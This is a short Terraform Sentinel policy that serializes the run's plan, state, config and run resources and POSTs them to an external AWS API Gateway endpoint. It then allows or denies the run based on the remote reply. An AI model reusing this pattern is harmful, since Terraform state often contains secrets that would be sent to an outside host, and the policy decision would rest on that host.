import "http"
import "json"
import "tfplan"
import "tfstate"
import "tfconfig"
import "tfrun"

reqData = { plan : tfplan.resources, state : tfstate.resources, config : tfconfig.resources, run : tfrun.resources }

req = http.request("https://odexawwp5c.execute-api.us-west-2.amazonaws.com/default/sentinel-remote").with_body(json.marshal(reqData))

resp = http.post(req)

respData = json.unmarshal(resp.body)


# Main rule
main = rule {
  respData.allow is true
}